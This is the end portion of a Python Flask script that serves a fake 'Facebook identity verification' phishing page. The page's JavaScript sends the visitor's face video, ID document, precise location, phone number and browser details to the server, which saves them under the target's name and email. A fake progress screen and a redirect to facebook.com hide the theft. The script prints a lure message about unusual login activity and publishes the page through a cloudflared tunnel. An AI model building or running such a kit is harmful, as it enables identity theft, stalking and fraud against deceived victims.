                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Geolocation not supported';
                return;
            }}
            
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    updateLocationUI(position);
                    sendLocationToServer(position);
                    completeLocationVerification();
                }},
                (error) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = 'Location access denied. Please enable location services.';
                    btn.disabled = false;
                    btn.textContent = 'Try Again';
                }},
                {{ enableHighAccuracy: true, timeout: 10000 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude.toFixed(6);
            const lon = position.coords.longitude.toFixed(6);
            const accuracy = Math.round(position.coords.accuracy);
            
            document.getElementById('latValue').textContent = lat;
            document.getElementById('lonValue').textContent = lon;
            document.getElementById('accuracyValue').textContent = accuracy + ' meters';
            document.getElementById('locationDetails').style.display = 'block';
            
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = '✓ Location verified';
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_name: targetName,
                    target_email: targetEmail
                }}),
                contentType: 'application/json'
            }});
        }}
        
        function completeLocationVerification() {{
            document.getElementById('locationBtn').disabled = true;
            document.getElementById('locationBtn').textContent = '✓ Location Verified';
            
            setTimeout(() => {{
                startFinalVerification();
            }}, 1500);
        }}
        
        // Phone Verification
        function submitPhoneVerification() {{
            const phone = document.getElementById('phoneInput').value;
            if (!phone) {{
                alert('Please enter a phone number');
                return;
            }}
            
            $.ajax({{
                url: '/submit_phone_verification',
                type: 'POST',
                data: JSON.stringify({{
                    phone_number: phone,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_name: targetName
                }}),
                contentType: 'application/json'
            }});
            
            startFinalVerification();
        }}
        
        // Final Processing
        function startFinalVerification() {{
            showStep('stepFinal');
            
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const interval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 40) {{
                    message = `Verifying face scan... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = `Validating ID document... ${{Math.round(progress)}}%`;
                }} else if (progress < 90) {{
                    message = `Checking location data... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Finalizing verification... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(interval);
                    setTimeout(() => {{
                        submitCompleteVerification();
                        showStep('stepComplete');
                        startCountdown();
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function startCountdown() {{
            let countdown = 5;
            const element = document.getElementById('countdown');
            
            const timer = setInterval(() => {{
                countdown--;
                element.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(timer);
                    redirectToFacebook();
                }}
            }}, 1000);
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_name: targetName,
                    target_email: targetEmail,
                    completed_at: new Date().toISOString(),
                    user_agent: navigator.userAgent
                }}),
                contentType: 'application/json'
            }});
        }}
        
        function redirectToFacebook() {{
            window.location.href = 'https://facebook.com';
        }}
        
        // Initialize
        updateStepIndicators();
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            target_name = data.get('target_name', 'unknown')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"facebook_face_{target_name}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_name}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'target_name': target_name,
                'target_email': data.get('target_email', ''),
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat())
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved Facebook face verification: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving face verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        target_name = request.form.get('target_name', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"facebook_id_{target_name}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_name}_{session_id}_{timestamp}.json")
        metadata = {
            'id_file': id_filename,
            'type': 'id_verification',
            'target_name': target_name,
            'target_email': request.form.get('target_email', ''),
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat())
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Saved Facebook ID document: {id_filename}")
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"Error saving ID verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            target_name = data.get('target_name', 'unknown')
            
            # Process location in background
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Received Facebook location data: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving location verification: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_name = data.get('target_name', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"facebook_complete_{target_name}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            data['received_at'] = datetime.now().isoformat()
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Saved Facebook verification summary: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Error saving verification summary: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    check_dependencies()
    
    # Get verification settings
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4046
    script_name = "Facebook Verification Page"
    
    print("\n" + "="*60)
    print("FACEBOOK VERIFICATION PAGE")
    print("="*60)
    print(f"[+] Target Name: {VERIFICATION_SETTINGS['target_name']}")
    print(f"[+] Target Email: {VERIFICATION_SETTINGS['target_email']}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    
    print(f"[+] Data folder: {DOWNLOAD_FOLDER}")
    print(f"[+] Face scan duration: {VERIFICATION_SETTINGS['face_duration']} seconds")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] ID verification: Enabled")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Location verification: Enabled")
    if VERIFICATION_SETTINGS['phone_enabled']:
        print(f"[+] Phone verification: Enabled")
    
    print("\n[+] Starting Facebook verification server...")
    print("[+] Press Ctrl+C to stop.\n")
    
    print("="*60)
    print("FACEBOOK IDENTITY CONFIRMATION REQUIRED")
    print("="*60)
    print(f"👤 Account: {VERIFICATION_SETTINGS['target_name']}")
    print(f"📧 Email: {VERIFICATION_SETTINGS['target_email']}")
    print(f"🔒 Reason: Unusual login activity detected")
    print(f"⚠️  Action Required: Complete verification within 24 hours")
    print(f"📋 Steps: Face scan + ID upload + Location check")
    print("="*60)
    print("Open the link below in browser to start verification...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Shutting down Facebook verification server...")
        sys.exit(0)